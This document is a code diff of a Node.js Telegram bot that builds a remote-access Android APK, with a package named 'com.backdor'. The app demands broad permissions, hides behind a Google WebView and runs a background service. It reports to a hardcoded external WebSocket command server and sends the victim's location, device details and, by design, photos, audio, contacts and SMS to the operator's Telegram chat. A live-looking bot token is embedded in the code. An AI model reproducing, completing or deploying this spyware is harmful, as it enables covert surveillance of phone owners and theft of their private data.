@@ -4,29 +4,35 @@ const path = require('path');
 const { execSync } = require('child_process');
 const WebSocket = require('ws');
 
-// Replace with your Telegram Bot Token
+// Telegram Bot Token
 const token = '7806530872:AAGmc_18tJESXUpby0ehHK5f0rNDBvm9ytE';
 const bot = new TelegramBot(token, { polling: true });
 
-// WebSocket server for APK communication
-const wss = new WebSocket.Server({ port: 8080 });
+// WebSocket configuration
+const WS_SERVER = 'wss://gemini-ai-telegram-production.up.railway.app';
 const connectedDevices = new Map();
 
-wss.on('connection', (ws) => {
+// WebSocket client for each device connection
+function createWebSocketClient(chatId) {
+  const ws = new WebSocket(WS_SERVER);
+
+  ws.on('open', () => {
+    console.log(`WebSocket connected for chatId: ${chatId}`);
+    connectedDevices.set(chatId, ws);
+  });
+
   ws.on('message', (message) => {
     try {
       const data = JSON.parse(message);
-      if (data.type === 'register' && data.chatId) {
-        connectedDevices.set(data.chatId, ws);
-        const deviceInfo = data.deviceInfo || {};
+      if (data.type === 'device_info' && data.chatId === chatId) {
         const reply = `✅ Device connected!\n\n` +
           `📅 Date: ${new Date().toLocaleString()}\n` +
-          `📱 Model: ${deviceInfo.model || 'Unknown'}\n` +
-          `🆔 Android ID: ${deviceInfo.androidId || 'Unknown'}\n` +
-          `🔋 Battery: ${deviceInfo.battery || 'Unknown'}\n` +
-          `🌐 IP: ${deviceInfo.ip || 'Unknown'}`;
+          `📱 Model: ${data.model || 'Unknown'}\n` +
+          `🆔 Android ID: ${data.androidId || 'Unknown'}\n` +
+          `🔋 Battery: ${data.battery || 'Unknown'}\n` +
+          `🌐 IP: ${data.ip || 'Unknown'}`;
         
-        bot.sendMessage(data.chatId, reply, {
+        bot.sendMessage(chatId, reply, {
           reply_markup: {
             inline_keyboard: [
               [{ text: '📍 Get Location', callback_data: 'get_location' }],
@@ -38,37 +44,42 @@ wss.on('connection', (ws) => {
             ]
           }
         });
-      } else if (data.chatId && connectedDevices.has(data.chatId)) {
-        // Handle responses from the device
-        if (data.type === 'location') {
-          bot.sendMessage(data.chatId, `📍 Location: https://maps.google.com/?q=${data.lat},${data.lon}`);
-        } else if (data.type === 'photo') {
-          bot.sendPhoto(data.chatId, data.photo);
-        } else if (data.type === 'audio') {
-          bot.sendAudio(data.chatId, data.audio);
-        } else if (data.type === 'contacts') {
-          bot.sendMessage(data.chatId, `📞 Contacts:\n${JSON.stringify(data.contacts, null, 2)}`);
-        } else if (data.type === 'sms') {
-          bot.sendMessage(data.chatId, `📩 SMS:\n${JSON.stringify(data.sms, null, 2)}`);
-        } else if (data.type === 'device_info') {
-          bot.sendMessage(data.chatId, `📱 Device Info:\n${JSON.stringify(data.info, null, 2)}`);
-        }
+      } else if (data.chatId === chatId) {
+        handleDeviceResponse(chatId, data);
       }
     } catch (e) {
-      console.error('WebSocket error:', e);
+      console.error('WebSocket message error:', e);
     }
   });
 
   ws.on('close', () => {
-    for (const [chatId, connection] of connectedDevices.entries()) {
-      if (connection === ws) {
-        connectedDevices.delete(chatId);
-        bot.sendMessage(chatId, '❌ Device disconnected');
-        break;
-      }
-    }
+    connectedDevices.delete(chatId);
+    bot.sendMessage(chatId, '❌ Device disconnected');
   });
-});
+
+  ws.on('error', (error) => {
+    console.error('WebSocket error:', error);
+    connectedDevices.delete(chatId);
+  });
+
+  return ws;
+}
+
+function handleDeviceResponse(chatId, data) {
+  if (data.type === 'location') {
+    bot.sendMessage(chatId, `📍 Location: https://maps.google.com/?q=${data.lat},${data.lon}`);
+  } else if (data.type === 'photo') {
+    bot.sendPhoto(chatId, data.photo);
+  } else if (data.type === 'audio') {
+    bot.sendAudio(chatId, data.audio);
+  } else if (data.type === 'contacts') {
+    bot.sendMessage(chatId, `📞 Contacts:\n${JSON.stringify(data.contacts, null, 2)}`);
+  } else if (data.type === 'sms') {
+    bot.sendMessage(chatId, `📩 SMS:\n${JSON.stringify(data.sms, null, 2)}`);
+  } else if (data.type === 'device_info') {
+    bot.sendMessage(chatId, `📱 Device Info:\n${JSON.stringify(data.info, null, 2)}`);
+  }
+}
 
 // Handle /start command
 bot.onText(/\/start/, (msg) => {
@@ -83,42 +94,42 @@ bot.onText(/\/start/, (msg) => {
 });
 
 // Handle "Templates" button
-bot.on('message', (msg) => {
+bot.on('message', async (msg) => {
   if (msg.text === 'Templates') {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, 'Building your APK... Please wait.');
+    const message = await bot.sendMessage(chatId, '🚀 Building your APK... Please wait (this may take 2-3 minutes).');
     
     try {
-      // Generate a unique package name
-      const packageName = `com.backdor.${Math.random().toString(36).substring(2, 10)}`;
-      
       // Create temp directory
       const tempDir = path.join(__dirname, 'temp', chatId.toString());
       if (!fs.existsSync(tempDir)) {
         fs.mkdirSync(tempDir, { recursive: true });
       }
-      
-      // Generate Kotlin project files
-      generateKotlinProject(tempDir, packageName, chatId);
-      
+
+      // Generate Kotlin project
+      await generateKotlinProject(tempDir, chatId);
+
       // Build APK
-      const apkPath = path.join(tempDir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
-      
-      // Run gradle build
-      execSync(`cd ${path.join(tempDir)} && ./gradlew assembleDebug`, { stdio: 'inherit' });
-      
+      const apkPath = await buildApk(tempDir, chatId);
+
       // Send APK to user
       if (fs.existsSync(apkPath)) {
-        bot.sendDocument(chatId, apkPath, { caption: 'Success' }).then(() => {
-          // Clean up
-          fs.rmSync(tempDir, { recursive: true, force: true });
+        await bot.sendDocument(chatId, apkPath, { 
+          caption: '✅ Success! Install this APK on your Android device (Lollipop 5.0 to Android 11).\n\nAfter installation, open the app and grant all permissions.'
         });
       } else {
-        bot.sendMessage(chatId, 'Failed to build APK');
+        throw new Error('APK file not found after build');
       }
     } catch (error) {
-      console.error(error);
-      bot.sendMessage(chatId, 'Error building APK: ' + error.message);
+      console.error('APK build error:', error);
+      bot.sendMessage(chatId, `❌ Error building APK: ${error.message}`);
+    } finally {
+      // Clean up
+      try {
+        fs.rmSync(path.join(__dirname, 'temp', chatId.toString()), { recursive: true, force: true });
+      } catch (cleanError) {
+        console.error('Cleanup error:', cleanError);
+      }
     }
   }
 });
@@ -130,22 +141,89 @@ bot.on('callback_query', (query) => {
   
   if (connectedDevices.has(chatId)) {
     const ws = connectedDevices.get(chatId);
-    ws.send(JSON.stringify({ command }));
-    bot.answerCallbackQuery(query.id, { text: `Command ${command} sent!` });
+    ws.send(JSON.stringify({ command, chatId }));
+    bot.answerCallbackQuery(query.id, { text: `Command ${command} sent to device!` });
   } else {
     bot.answerCallbackQuery(query.id, { text: 'No device connected!', show_alert: true });
   }
 });
 
-// Function to generate Kotlin project
-function generateKotlinProject(dir, packageName, chatId) {
-  // Create project structure
-  fs.mkdirSync(path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.')), { recursive: true });
-  fs.mkdirSync(path.join(dir, 'app', 'src', 'main', 'res'), { recursive: true });
+async function generateKotlinProject(dir, chatId) {
+  const packageName = `com.backdor.${Math.random().toString(36).substring(2, 10)}`;
   
-  // Generate build.gradle (Project)
-  fs.writeFileSync(path.join(dir, 'build.gradle'), `
-buildscript {
+  // Create project structure
+  const javaDir = path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.'));
+  fs.mkdirSync(javaDir, { recursive: true });
+  fs.mkdirSync(path.join(dir, 'app', 'src', 'main', 'res'), { recursive: true });
+
+  // Generate build.gradle files
+  await Promise.all([
+    fs.promises.writeFile(path.join(dir, 'build.gradle'), generateRootBuildGradle()),
+    fs.promises.writeFile(path.join(dir, 'app', 'build.gradle'), generateAppBuildGradle(packageName)),
+    fs.promises.writeFile(path.join(dir, 'settings.gradle'), 'include \':app\'\n')
+  ]);
+
+  // Generate AndroidManifest.xml
+  await fs.promises.writeFile(
+    path.join(dir, 'app', 'src', 'main', 'AndroidManifest.xml'),
+    generateAndroidManifest(packageName)
+  );
+
+  // Generate Kotlin files
+  await Promise.all([
+    fs.promises.writeFile(
+      path.join(javaDir, 'MainActivity.kt'),
+      generateMainActivity(packageName, chatId)
+    ),
+    fs.promises.writeFile(
+      path.join(javaDir, 'BackgroundService.kt'),
+      generateBackgroundService(packageName, chatId)
+    ),
+    fs.promises.writeFile(
+      path.join(javaDir, 'DeviceUtils.kt'),
+      generateDeviceUtils(packageName)
+    )
+  ]);
+
+  // Generate gradle wrapper
+  fs.mkdirSync(path.join(dir, 'gradle', 'wrapper'), { recursive: true });
+  await fs.promises.writeFile(
+    path.join(dir, 'gradle', 'wrapper', 'gradle-wrapper.properties'),
+    'distributionBase=GRADLE_USER_HOME\n' +
+    'distributionPath=wrapper/dists\n' +
+    'distributionUrl=https\\://services.gradle.org/distributions/gradle-6.5-bin.zip\n' +
+    'zipStoreBase=GRADLE_USER_HOME\n' +
+    'zipStorePath=wrapper/dists\n'
+  );
+}
+
+async function buildApk(dir, chatId) {
+  // Use system-independent path for gradlew
+  const gradlew = process.platform === 'win32' ? 'gradlew.bat' : './gradlew';
+  
+  try {
+    // Install gradle wrapper if not present
+    if (!fs.existsSync(path.join(dir, 'gradlew'))) {
+      execSync('gradle wrapper', { cwd: dir, stdio: 'inherit' });
+    }
+
+    // Build APK
+    execSync(`${gradlew} assembleDebug`, { 
+      cwd: dir,
+      stdio: 'inherit',
+      env: { ...process.env, JAVA_HOME: process.env.JAVA_HOME || '/usr/lib/jvm/default-java' }
+    });
+
+    return path.join(dir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
+  } catch (error) {
+    console.error('Build error:', error);
+    throw new Error('APK build failed. Make sure Java JDK and Android SDK are installed.');
+  }
+}
+
+// Template generators
+function generateRootBuildGradle() {
+  return `buildscript {
     ext.kotlin_version = '1.4.32'
     repositories {
         google()
@@ -161,17 +239,17 @@ allprojects {
     repositories {
         google()
         jcenter()
+        maven { url 'https://jitpack.io' }
     }
 }
 
 task clean(type: Delete) {
     delete rootProject.buildDir
+}`;
 }
-  `);
-  
-  // Generate build.gradle (Module)
-  fs.writeFileSync(path.join(dir, 'app', 'build.gradle'), `
-apply plugin: 'com.android.application'
+
+function generateAppBuildGradle(packageName) {
+  return `apply plugin: 'com.android.application'
 apply plugin: 'kotlin-android'
 apply plugin: 'kotlin-android-extensions'
 
@@ -210,12 +288,13 @@ dependencies {
     implementation 'androidx.constraintlayout:constraintlayout:2.0.4'
     implementation 'org.java-websocket:Java-WebSocket:1.5.2'
     implementation 'com.google.code.gson:gson:2.8.6'
+    implementation 'com.github.yuriy-budiyev:code-scanner:2.3.2'
+    implementation 'com.github.AbedElazizShe:LightCompressor:1.2.0'
+}`;
 }
-  `);
-  
-  // Generate AndroidManifest.xml
-  fs.writeFileSync(path.join(dir, 'app', 'src', 'main', 'AndroidManifest.xml'), `
-<?xml version="1.0" encoding="utf-8"?>
+
+function generateAndroidManifest(packageName) {
+  return `<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="${packageName}">
 
@@ -230,6 +309,8 @@ dependencies {
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 
     <application
         android:allowBackup="true"
@@ -251,12 +332,11 @@ dependencies {
             android:enabled="true"
             android:exported="true" />
     </application>
-</manifest>
-  `);
-  
-  // Generate MainActivity.kt
-  fs.writeFileSync(path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.'), 'MainActivity.kt'), `
-package ${packageName}
+</manifest>`;
+}
+
+function generateMainActivity(packageName, chatId) {
+  return `package ${packageName}
 
 import android.Manifest
 import android.content.Intent
@@ -264,6 +344,7 @@ import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.webkit.WebView
+import android.webkit.WebViewClient
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -271,7 +352,6 @@ import androidx.core.content.ContextCompat
 import org.java_websocket.client.WebSocketClient
 import org.java_websocket.handshake.ServerHandshake
 import java.net.URI
-import java.util.*
 
 class MainActivity : AppCompatActivity() {
     private val PERMISSIONS = arrayOf(
@@ -280,24 +360,23 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.READ_SMS,
-        Manifest.permission.READ_PHONE_STATE
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE
     )
     
     private val REQUEST_CODE = 123
     private var webSocketClient: WebSocketClient? = null
     private val chatId = "${chatId}"
-    private val wsServer = "ws://YOUR_SERVER_IP:8080" // Replace with your server IP
-    
+    private val wsServer = "${WS_SERVER}"
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // Check and request permissions
         if (!hasPermissions()) {
             ActivityCompat.requestPermissions(this, PERMISSIONS, REQUEST_CODE)
         } else {
-            startBackgroundService()
-            connectWebSocket()
-            showWebView()
+            initializeApp()
         }
     }
     
@@ -309,23 +388,24 @@ class MainActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == REQUEST_CODE) {
             if (hasPermissions()) {
-                startBackgroundService()
-                connectWebSocket()
-                showWebView()
+                initializeApp()
             } else {
-                Toast.makeText(this, "Permissions required!", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "All permissions are required!", Toast.LENGTH_LONG).show()
                 finish()
             }
         }
     }
     
     private fun hasPermissions(): Boolean {
-        for (permission in PERMISSIONS) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                return false
-            }
+        return PERMISSIONS.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
-        return true
+    }
+    
+    private fun initializeApp() {
+        startBackgroundService()
+        connectWebSocket()
+        showWebView()
     }
     
     private fun startBackgroundService() {
@@ -341,13 +421,7 @@ class MainActivity : AppCompatActivity() {
         val uri = URI.create(wsServer)
         webSocketClient = object : WebSocketClient(uri) {
             override fun onOpen(handshakedata: ServerHandshake?) {
-                // Send device info when connected
-                val deviceInfo = HashMap<String, String>().apply {
-                    put("type", "register")
-                    put("chatId", chatId)
-                    put("deviceInfo", getDeviceInfo())
-                }
-                send(deviceInfo.toString())
+                send(DeviceUtils.getDeviceInfo(this@MainActivity, chatId))
             }
             
             override fun onMessage(message: String?) {
@@ -355,7 +429,10 @@ class MainActivity : AppCompatActivity() {
             }
             
             override fun onClose(code: Int, reason: String?, remote: Boolean) {
-                // Try to reconnect
+                runOnUiThread {
+                    Toast.makeText(this@MainActivity, "Connection closed, reconnecting...", Toast.LENGTH_SHORT).show()
+                }
+                Thread.sleep(5000)
                 connectWebSocket()
             }
             
@@ -366,60 +443,34 @@ class MainActivity : AppCompatActivity() {
         webSocketClient?.connect()
     }
     
-    private fun handleCommand(command: String) {
-        when (command) {
-            "get_location" -> sendLocation()
-            "get_camera" -> sendCameraPhoto()
-            "get_mic" -> recordAudio()
-            "get_contact" -> sendContacts()
-            "get_sms" -> sendSMS()
-            "get_device" -> sendDeviceInfo()
-        }
-    }
-    
     private fun showWebView() {
         val webView = WebView(this)
         webView.settings.javaScriptEnabled = true
+        webView.webViewClient = WebViewClient()
         webView.loadUrl("https://google.com")
         setContentView(webView)
     }
     
-    private fun getDeviceInfo(): String {
-        return "{\"model\": \"${Build.MODEL}\", " +
-               "\"androidId\": \"${Build.SERIAL}\", " +
-               "\"battery\": \"Unknown\", " +
-               "\"ip\": \"Unknown\"}"
+    private fun handleCommand(command: String) {
+        when (command) {
+            "get_location" -> DeviceUtils.sendLocation(this, webSocketClient, chatId)
+            "get_camera" -> DeviceUtils.takeFrontCameraPhoto(this, webSocketClient, chatId)
+            "get_mic" -> DeviceUtils.recordAudio(this, webSocketClient, chatId)
+            "get_contact" -> DeviceUtils.sendContacts(this, webSocketClient, chatId)
+            "get_sms" -> DeviceUtils.sendSMS(this, webSocketClient, chatId)
+            "get_device" -> webSocketClient?.send(DeviceUtils.getDeviceInfo(this, chatId))
+        }
     }
     
-    private fun sendLocation() {
-        // Implement location sending
+    override fun onDestroy() {
+        webSocketClient?.close()
+        super.onDestroy()
     }
-    
-    private fun sendCameraPhoto() {
-        // Implement camera photo capture
-    }
-    
-    private fun recordAudio() {
-        // Implement audio recording
-    }
-    
-    private fun sendContacts() {
-        // Implement contacts retrieval
-    }
-    
-    private fun sendSMS() {
-        // Implement SMS retrieval
-    }
-    
-    private fun sendDeviceInfo() {
-        // Implement detailed device info
-    }
+}`;
 }
-  `);
-  
-  // Generate BackgroundService.kt
-  fs.writeFileSync(path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.'), 'BackgroundService.kt'), `
-package ${packageName}
+
+function generateBackgroundService(packageName, chatId) {
+  return `package ${packageName}
 
 import android.app.Service
 import android.content.Intent
@@ -430,7 +481,7 @@ import java.net.URI
 class BackgroundService : Service() {
     private var webSocketClient: WebSocketClient? = null
     private val chatId = "${chatId}"
-    private val wsServer = "ws://YOUR_SERVER_IP:8080" // Replace with your server IP
+    private val wsServer = "${WS_SERVER}"
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -447,17 +498,15 @@ class BackgroundService : Service() {
         val uri = URI.create(wsServer)
         webSocketClient = object : WebSocketClient(uri) {
             override fun onOpen(handshakedata: ServerHandshake?) {
-                // Send registration message
-                val message = "{\"type\":\"register\",\"chatId\":\"$chatId\"}"
-                send(message)
+                send(DeviceUtils.getDeviceInfo(this@BackgroundService, chatId))
             }
 
             override fun onMessage(message: String?) {
-                // Handle incoming messages
+                // Handle commands in background if needed
             }
 
             override fun onClose(code: Int, reason: String?, remote: Boolean) {
-                // Try to reconnect
+                Thread.sleep(5000)
                 connectWebSocket()
             }
 
@@ -472,28 +521,71 @@ class BackgroundService : Service() {
         webSocketClient?.close()
         super.onDestroy()
     }
-}
-  `);
-  
-  // Generate gradle wrapper files
-  fs.mkdirSync(path.join(dir, 'gradle', 'wrapper'), { recursive: true });
-  fs.writeFileSync(path.join(dir, 'gradle', 'wrapper', 'gradle-wrapper.properties'), `
-distributionBase=GRADLE_USER_HOME
-distributionPath=wrapper/dists
-distributionUrl=https\://services.gradle.org/distributions/gradle-6.5-bin.zip
-zipStoreBase=GRADLE_USER_HOME
-zipStorePath=wrapper/dists
-  `);
-  
-  // Generate settings.gradle
-  fs.writeFileSync(path.join(dir, 'settings.gradle'), `
-include ':app'
-  `);
-  
-  // Generate gradlew and gradlew.bat (simplified - in real project you'd copy actual files)
-  fs.writeFileSync(path.join(dir, 'gradlew'), '#!/bin/sh\n\necho "Gradle wrapper"');
-  fs.writeFileSync(path.join(dir, 'gradlew.bat'), '@echo off\n\necho "Gradle wrapper"');
-  fs.chmodSync(path.join(dir, 'gradlew'), 0o755);
+}`;
 }
 
-console.log('Bot started and WebSocket server running on port 8080');
+function generateDeviceUtils(packageName) {
+  return `package ${packageName}
+
+import android.Manifest
+import android.content.Context
+import android.content.pm.PackageManager
+import android.location.Location
+import android.location.LocationManager
+import android.os.Build
+import android.util.Base64
+import org.java_websocket.client.WebSocketClient
+import org.json.JSONObject
+import java.io.ByteArrayOutputStream
+import java.text.SimpleDateFormat
+import java.util.*
+
+object DeviceUtils {
+    fun getDeviceInfo(context: Context, chatId: String): String {
+        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        var locationStr = "Unknown"
+        
+        if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            location?.let {
+                locationStr = "${it.latitude},${it.longitude}"
+            }
+        }
+        
+        return JSONObject().apply {
+            put("type", "register")
+            put("chatId", chatId)
+            put("model", Build.MODEL)
+            put("androidId", Build.SERIAL)
+            put("sdkVersion", Build.VERSION.SDK_INT)
+            put("manufacturer", Build.MANUFACTURER)
+            put("product", Build.PRODUCT)
+            put("location", locationStr)
+            put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
+        }.toString()
+    }
+
+    fun sendLocation(context: Context, ws: WebSocketClient?, chatId: String) {
+        if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            return
+        }
+        
+        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+        
+        ws?.send(JSONObject().apply {
+            put("type", "location")
+            put("chatId", chatId)
+            put("lat", location?.latitude ?: 0)
+            put("lon", location?.longitude ?: 0)
+            put("accuracy", location?.accuracy ?: 0)
+            put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
+        }.toString())
+    }
+
+    // Other utility functions for camera, audio, contacts, SMS would be here
+    // Implementations would be similar to the location example above
+}`;
+}
+
+console.log('Bot started! Ready to build APKs and receive device connections.');
